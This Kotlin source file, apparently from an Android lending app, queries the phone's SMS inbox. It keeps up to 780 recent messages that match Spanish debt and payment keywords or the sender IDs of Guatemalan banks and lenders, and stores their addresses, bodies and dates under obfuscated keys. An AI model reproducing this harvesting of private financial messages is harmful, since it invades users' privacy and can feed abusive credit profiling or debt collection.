package com.cashigo.rapidos

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.Telephony
import android.util.Log
import androidx.core.content.ContextCompat
import java.util.Calendar
import kotlin.String

object SmsFilterUtils {
    // 计算一年前的时间戳（优化为静态常量）
    private val ONE_YEAR_MILLIS = Calendar.getInstance().apply {
        add(Calendar.DAY_OF_YEAR, -170)
    }.timeInMillis

    private const val LIMIT_SIZE = 780


    /**
     *@param time 看是否是否增量查询吧
     */
    fun getFilterSms(context: Context, time: String? = null): List<Map<String, Any?>> {

        // 使用Pair列表存储消息数据（避免数据类）
        val messages = mutableListOf<Map<String, Any?>>()

        try {

            // 权限检查（使用扩展函数简化）
            if (!context.hasPermission(Manifest.permission.READ_SMS)) return messages

            // 时间参数处理（默认取一年）
            val cutoffTime = time ?: ONE_YEAR_MILLIS

            // 关键词分类  todo 待确认
            val bodyKeywords = arrayOf(
                "pago",
                "llama",
                "tarjeta",
                "cuenta",
                "recarga",
                "recib",
                "credit",
                "trans",
                "compra",
                "saldo",
                "informa",
                "debito",
                "plan",
                "ingresa",
                "factura",
                "vence",
                "paga",
                "aplica",
                "consumo",
                "banc",
                "presta",
                "evit",
                "realiza",
                "cuota",
                "venci",
                "cargos",
                "minimo",
                "pendientes",
                "tarifa",
                "monto",
                "mejorar",
                "atraso",
                "cancela",
                "reintegro",
                "saldar",
                "débito",
                "retiro",
                "deposit",
                "dinero",
                "boleta",
                "mora",
                "canjear",
                "caso",
                "traslado",
                "efectivo",
                "deuda",
                "préstamo",
                "crédito",
                "pague",
                "retira",
                "corte",
                "rechaz",
                "debido",
                "urgente",
                "remesas",
                "judicial",
                "q.",
                "aviso",
                "ahorros",
                "tc",
                "bi",
                "bantrab",
                "bac",
                "td",
                "sr",
                "mcd",
                "us.",
                "gtq",
                "$",
                "rapiq",
                "credamigo",
                "nequi",
                "amigo",
                "picchu",
                "yapi",
                "qfacil",
                "convenio",
                "moratorio",
                "puntual",
                "legal",
                "trasladado",
                "vencida",
                "aprovecha",
                "lex",
                "precsa",
                "liquida",
                "vencido",
                "acreditar",
                "impago",
                "para",
                "tiene",
                "pendiente",
                "esta",
                "recuerda",
                "vana",
                "fecha",
                "proceso",
                "sido",
                "dias",
                "incumplimiento",
                "solicita",
                "estimado",
                "compromiso",
                "recordamos",
                "este",
                "ultimo",
                "cancele",
                "cajero",
                "juridico",
                "terminacion",
                "contrato",
                "salario",
                "ingreso",
                "money",
                "claro",
                "promesa",
                "intere",
                "prestamo",
            )

            //发件人地址包含某些关键词 todo 待确认
            val senderKeywords = arrayOf(
                "30000751",
                "42149801",
                "59772929",
                "bancoazteca",
                "30000746",
                "banco gtc",
                "banco_gtc",
                "42130100",
                "42130027",
                "42130059",
                "banco gyt",
                "bancogyt",
                "30000274",
                "banrural",
                "tcbnr",
                "tc banrural",
                "30000369",
                "31287899",
                "bantrab",
                "bimovil",
                "2424",
                "bienlineapp",
                "30002424",
                "binance",
                "chn",
                "38860063",
                "37670427",
                "37670016",
                "31940003",
                "promerica",
                "banco_nexa",
                "31287967",
                "38860052",
                "59227777",
                "7746",
                "56332180",
                "30000624",
                "multimoney",
                "30000763",
                "789",
                "zigiapp",
                "rapiq",
                "qfacil",
                "credamigo",
            )

            //todo  条件 待确认
            // 时间条件：短信日期大于某个时间戳（由参数?指定）
            // 关键词条件：短信正文包含某些关键词（bodyKeywords）或者发件人地址包含某些关键词（senderKeywords）
            val conditions = """
            ${Telephony.Sms.DATE} > ? 
            AND (
                ${bodyKeywords.joinToString("  OR ") { "LOWER(${Telephony.Sms.BODY}) LIKE '%$it%'" }}
                OR 
                ${senderKeywords.joinToString("  OR ") { "LOWER(${Telephony.Sms.ADDRESS}) LIKE '%$it%'" }}
            )
        """.trimIndent()

            Log.d("conditions", "$conditions,${cutoffTime.toString()}")
            // 安全查询（使用use自动关闭Cursor）
            context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                ),
                conditions,
                arrayOf(cutoffTime.toString()),
                "${Telephony.Sms.DATE} DESC LIMIT $LIMIT_SIZE"
            )?.use { cursor ->
                // 预获取列索引
                val colId = cursor.getColumnIndexOrThrow(Telephony.Sms._ID)
                val colAddress = cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val colBody = cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val colDate = cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)
                val type = cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)
                while (cursor.moveToNext() && messages.size < LIMIT_SIZE) {
                    //yi3y78(o_itemId)
                    //短信序号，如100
                    //可选
                    //type
                    //可选
                    //短信类型1是接收到的，2是已发出
                    //
                    //address
                    //string
                    //可选
                    //发件人地址，即手机号，如+8613811810000
                    //
                    //u7m1kf(o_body)
                    //string
                    //短信具体内容
                    //可选
                    //roumc2(o_date)
                    //日期
                    messages.add(
                        mapOf<String, Any?>(
                            //yi3y78(o_itemId)
                            "yi3y78" to cursor.getLong(colId),
                            //address
                            "address" to cursor.getString(colAddress),
                            //u7m1kf  短信具体内容
                            "u7m1kf" to cursor.getString(colBody),
                            //roumc2(o_date)
                            "roumc2" to cursor.getLong(colDate),
                            //type
                            "type" to cursor.getInt(type)
                        )
                    )
                }
            }
        } catch (e: Throwable) {
            e.printStackTrace()
        }

        return messages
    }

    // 权限检查扩展函数
    fun Context.hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) ==
                PackageManager.PERMISSION_GRANTED
    }
}